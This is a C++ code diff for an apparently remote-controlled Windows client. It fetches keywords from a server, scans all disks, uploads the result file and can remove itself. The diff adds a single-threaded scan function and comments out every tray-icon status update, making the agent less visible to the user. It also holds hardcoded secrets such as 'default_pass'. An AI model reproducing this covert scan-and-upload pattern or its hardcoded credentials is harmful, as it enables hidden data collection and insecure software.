@@ -379,7 +379,8 @@ bool GetFromServer()
 			SendInfo("COK", "executing task");
 			char filename[40] = { 0 };
 			sprintf(filename, "first-%s.rlog", username);
-			RemoteAllScan(filename);
+			//RemoteAllScan(filename);
+			RemoteAllScan1(filename);
 		}
 		//快速扫描
 		if (strcmp(info, "006#") == 0)
@@ -528,6 +529,7 @@ bool GetKeyFile()
 	return TRUE;
 }
 
+//多线程扫描
 bool RemoteAllScan(char* filename)
 {
 	//扫描之前删除上一次扫描的文件
@@ -538,6 +540,43 @@ bool RemoteAllScan(char* filename)
 
 	char info[50];
 	Scaner::alldiskscan();
+	isScan = FALSE;
+	MoveFile("first.rlog", filename);
+	SendInfo("UPD", filename);
+	SendInfo("RPL", "12345678123456781234567812345678");
+	GetReplyInfo(info);
+
+	FILE *fp = fopen(filename, "rb");
+	if (fp == NULL)
+		return FALSE;
+	fseek(fp, 0, SEEK_END);
+	int size = ftell(fp);
+	fseek(fp, 0, SEEK_SET);
+	fclose(fp);
+	char buf[100] = { 0 };
+	sprintf(buf, "%d default_pass", size);
+	SendInfo("RPL", buf);
+	GetReplyInfo(info);
+
+	//上传文件
+	SOCKET sock;
+	if (areYouReady(sock, 1))
+	{
+		UploadFile(sock, filename);
+	}
+}
+
+//单线程扫描
+bool RemoteAllScan1(char* filename)
+{
+	//扫描之前删除上一次扫描的文件
+	remove(filename);
+	//从服务器获取关键字信息
+	if (!GetKeyFile())
+		return FALSE;
+
+	char info[50];
+	Scaner::alldiskscannormal();
 	isScan = FALSE;
 	MoveFile("first.rlog", filename);
 	SendInfo("UPD", filename);
@@ -742,8 +781,10 @@ void RemoteRemoveSelf()
 DWORD _stdcall GetServerCommand(LPVOID Dlg)
 {
 	GetConfig();
+	/*
 	Shell_NotifyIcon(NIM_DELETE, &((CMainClientDlg*)Dlg)->m_nid);
 	((CMainClientDlg*)Dlg)->InitTray(1);
+	*/
 	isConnect = TRUE;
 
 	while (1)
@@ -756,8 +797,10 @@ DWORD _stdcall GetServerCommand(LPVOID Dlg)
 		{
 			if (AutoAuthentication())
 			{
+				/*
 				Shell_NotifyIcon(NIM_DELETE, &((CMainClientDlg*)Dlg)->m_nid);
 				((CMainClientDlg*)Dlg)->InitTray(1);
+				*/
 				isConnect = TRUE;
 			}
 		}
@@ -818,8 +861,10 @@ DWORD _stdcall HeartBeat(LPVOID Dlg)
 		if (!CheckInternet())
 		{
 			isConnect = FALSE;
+			/*
 			Shell_NotifyIcon(NIM_DELETE, &((CMainClientDlg*)Dlg)->m_nid);
 			((CMainClientDlg*)Dlg)->InitTray(0);
+			*/
 			EndSSL();
 			Sleep(5000);
 			continue;
@@ -834,8 +879,10 @@ DWORD _stdcall HeartBeat(LPVOID Dlg)
 			if (nRet == FALSE)
 			{
 				isConnect = FALSE;
+				/*
 				Shell_NotifyIcon(NIM_DELETE, &((CMainClientDlg*)Dlg)->m_nid);
 				((CMainClientDlg*)Dlg)->InitTray(0);
+				*/
 				EndSSL();
 			}
 		}
@@ -849,15 +896,19 @@ DWORD _stdcall HeartBeat(LPVOID Dlg)
 			if (strcmp(info, "HBT") != 0)
 			{
 				isConnect = FALSE;
+				/*
 				Shell_NotifyIcon(NIM_DELETE, &((CMainClientDlg*)Dlg)->m_nid);
 				((CMainClientDlg*)Dlg)->InitTray(0);
+				*/
 				EndSSL();
 			}
 			if (strcmp(info, "WHO ARE YOU") == 0)
 			{
 				isConnect = FALSE;
+				/*
 				Shell_NotifyIcon(NIM_DELETE, &((CMainClientDlg*)Dlg)->m_nid);
 				((CMainClientDlg*)Dlg)->InitTray(0);
+				*/
 				EndSSL();
 			}
 			//扫描时10秒一次心跳测试
